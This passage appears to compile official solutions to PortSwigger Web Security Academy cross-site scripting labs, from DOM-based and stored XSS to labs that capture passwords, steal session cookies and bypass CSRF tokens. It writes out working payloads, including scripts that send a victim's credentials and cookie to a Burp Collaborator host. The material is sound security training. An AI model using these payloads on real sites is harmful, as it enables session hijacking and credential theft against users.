[Open the lab](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored)

This lab demonstrates a stored DOM vulnerability in the blog comment functionality. To solve this lab, exploit this vulnerability to call the `alert()` function.

<details><summary>Official solution</summary>

Post a comment containing the following vector:

`<><img src=1 onerror=alert(1)>`

In an attempt to prevent XSS, the website uses the JavaScript `replace()` function to encode angle brackets. However, when the first argument is a string, the function only replaces the first occurrence. We exploit this vulnerability by simply including an extra set of angle brackets at the beginning of the comment. These angle brackets will be encoded, but any subsequent angle brackets will be unaffected, enabling us to effectively bypass the filter and inject HTML.

</details>

<details><summary>Community solutions</summary>

##### z3nsh3ll

https://www.youtube.com/watch?v=kjPwxAPt318

##### Michael Sommer

https://www.youtube.com/watch?v=dcxEl5_s_mY

</details>


## 23. DOM XSS in innerHTML sink using source location.search

[Open the lab](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink)

This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an `innerHTML` assignment, which changes the HTML contents of a `div` element, using data from `location.search`.

To solve this lab, perform a cross-site scripting attack that calls the `alert` function.

<details><summary>Official solution</summary>

1. Enter the following into the into the search box:

   `<img src=1 onerror=alert(1)>`
2. Click "Search".

The value of the `src` attribute is invalid and throws an error. This triggers the `onerror` event handler, which then calls the `alert()` function. As a result, the payload is executed whenever the user's browser attempts to load the page containing your malicious post.

</details>

<details><summary>Community solutions</summary>

##### z3nsh3ll

https://www.youtube.com/watch?v=Rf9OKtbYkeo

##### Michael Sommer

https://www.youtube.com/watch?v=447mUdY8UVg

</details>


## 24. DOM XSS in jQuery anchor href attribute sink using location.search source

[Open the lab](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink)

This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's `$` selector function to find an anchor element, and changes its `href` attribute using data from `location.search`.

To solve this lab, make the "back" link alert `document.cookie`.

<details><summary>Official solution</summary>

1. On the Submit feedback page, change the query parameter `returnPath` to `/` followed by a random alphanumeric string.
2. Right-click and inspect the element, and observe that your random string has been placed inside an a `href` attribute.
3. Change `returnPath` to:

   `javascript:alert(document.cookie)`

   Hit enter and click "back".

</details>

<details><summary>Community solutions</summary>

##### z3nsh3ll

https://www.youtube.com/watch?v=7WRZUZ4Pqn0

##### Michael Sommer

https://www.youtube.com/watch?v=B2E9cEZQQXg

</details>


## 25. DOM XSS in jQuery selector sink using a hashchange event

[Open the lab](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event)

This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's `$()` selector function to auto-scroll to a given post, whose title is passed via the `location.hash` property.

To solve the lab, deliver an exploit to the victim that calls the `print()` function in their browser.

<details><summary>Official solution</summary>

1. Notice the vulnerable code on the home page using Burp or the browser's DevTools.
2. From the lab banner, open the exploit server.
3. In the **Body** section, add the following malicious `iframe`:

   `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>`
4. Store the exploit, then click **View exploit** to confirm that the `print()` function is called.
5. Go back to the exploit server and click **Deliver to victim** to solve the lab.

</details>

<details><summary>Community solutions</summary>

##### Jarno Timmermans

https://www.youtube.com/watch?v=ERJO3a52OlE

##### z3nsh3ll

https://www.youtube.com/watch?v=5OiWO5Qr-iI

##### Intigriti

https://www.youtube.com/watch?v=JgiX3kyK8ME

</details>


## 26. Exploiting cross-site scripting to capture passwords

[Open the lab](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords)

This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.

#### Note

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

Some users will notice that there is an alternative solution to this lab that does not require Burp Collaborator. However, it is far less subtle than exfiltrating the credentials.

<details><summary>Official solution</summary>

1. Using Burp Suite Professional, go to the [Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) tab.
2. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
3. Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:

   `<input name=username id=username>
   <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
   method:'POST',
   mode: 'no-cors',
   body:username.value+':'+this.value
   });">`

   This script will make anyone who views the comment issue a POST request containing their username and password to your subdomain of the public Collaborator server.
4. Go back to the Collaborator tab, and click "Poll now". You should see an HTTP interaction. If you don't see any interactions listed, wait a few seconds and try again.
5. Take a note of the value of the victim's username and password in the POST body.
6. Use the credentials to log in as the victim user.

#### Alternative solution

Alternatively, you could adapt the attack to make the victim post their credentials within a blog comment by [exploiting the XSS to perform CSRF](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf). However, this is far less subtle because it exposes the username and password publicly, and also discloses evidence that the attack was performed.

</details>

<details><summary>Community solutions</summary>

##### z3nsh3ll

https://www.youtube.com/watch?v=I6TOtXSOZ90

##### Michael Sommer

https://www.youtube.com/watch?v=JqSbrD2gduQ

</details>


## 27. Exploiting XSS to bypass CSRF defenses

[Open the lab](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf)

This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to steal a CSRF token, which you can then use to change the email address of someone who views the blog post comments.

You can log in to your own account using the following credentials: `wiener:peter`

<details><summary>Hint</summary>

You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, use a different email address for the final exploit you deliver to the victim.

</details>

<details><summary>Official solution</summary>

1. Log in using the credentials provided. On your user account page, notice the function for updating your email address.
2. If you view the source for the page, you'll see the following information:
   - You need to issue a POST request to `/my-account/change-email`, with a parameter called `email`.
   - There's an anti-CSRF token in a hidden input called `token`.This means your exploit will need to load the user account page, extract the CSRF token, and then use the token to change the victim's email address.
3. Submit the following payload in a blog comment:

   `<script>
   var req = new XMLHttpRequest();
   req.onload = handleResponse;
   req.open('get','/my-account',true);
   req.send();
   function handleResponse() {
   var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
   var changeReq = new XMLHttpRequest();
   changeReq.open('post', '/my-account/change-email', true);
   changeReq.send('csrf='+token+'&email=test@test.com')
   };
   </script>`

   This will make anyone who views the comment issue a POST request to change their email address to `test@test.com`.

</details>

<details><summary>Community solutions</summary>

##### z3nsh3ll

https://www.youtube.com/watch?v=DWThhRPwGEg

##### Michael Sommer

https://www.youtube.com/watch?v=TUUSm6o1afA

</details>


## 28. Exploiting cross-site scripting to steal cookies

[Open the lab](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)

This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.

#### Note

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

Some users will notice that there is an alternative solution to this lab that does not require Burp Collaborator. However, it is far less subtle than exfiltrating the cookie.

<details><summary>Official solution</summary>

1. Using Burp Suite Professional, go to the [Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) tab.
2. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
3. Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:

   `<script>
   fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
   method: 'POST',
   mode: 'no-cors',
   body:document.cookie
   });
   </script>`

   This script will make anyone who views the comment issue a POST request containing their cookie to your subdomain on the public Collaborator server.
4. Go back to the Collaborator tab, and click "Poll now". You should see an HTTP interaction. If you don't see any interactions listed, wait a few seconds and try again.
5. Take a note of the value of the victim's cookie in the POST body.
6. Reload the main blog page, using Burp Proxy or Burp Repeater to replace your own session cookie with the one you captured in Burp Collaborator. Send the request to solve the lab. To prove that you have successfully hijacked the admin user's session, you can use the same cookie in a request to `/my-account` to load the admin user's account page.

#### Alternative solution

Alternatively, you could adapt the attack to make the victim post their session cookie within a blog comment by [exploiting the XSS to perform CSRF](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf). However, this is far less subtle because it exposes the cookie publicly, and also discloses evidence that the attack was performed.

</details>

<details><summary>Community solutions</summary>

##### z3nsh3ll

https://www.youtube.com/watch?v=N_87S9XVy0w

##### Michael Sommer

https://www.youtube.com/watch?v=g9-Zta5OO_0

</details>


## 29. Reflected XSS into HTML context with nothing encoded

[Open the lab](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded)

This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.

To solve the lab, perform a cross-site scripting attack that calls the `alert` function.

<details><summary>Official solution</summary>

1. Copy and paste the following into the search box:

   `<script>alert(1)</script>`
2. Click "Search".

</details>

<details><summary>Community solutions</summary>

##### z3nsh3ll

https://www.youtube.com/watch?v=P8YOuAYW8es

##### Michael Sommer

https://www.youtube.com/watch?v=mW4pFLD-4Hw

</details>


## 30. Stored XSS into HTML context with nothing encoded

[Open the lab](https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded)

This lab contains a stored cross-site scripting vulnerability in the comment functionality.

To solve this lab, submit a comment that calls the `alert` function when the blog post is viewed.

<details><summary>Official solution</summary>

1. Enter the following into the comment box:

   `<script>alert(1)</script>`
2. Enter a name, email and website.
3. Click "Post comment".
4. Go back to the blog.

</details>

<details><summary>Community solutions</summary>

##### z3nsh3ll

https://www.youtube.com/watch?v=dWQVRHGs6r4

##### Michael Sommer

https://www.youtube.com/watch?v=Rz1vQGKIQVQ

</details>

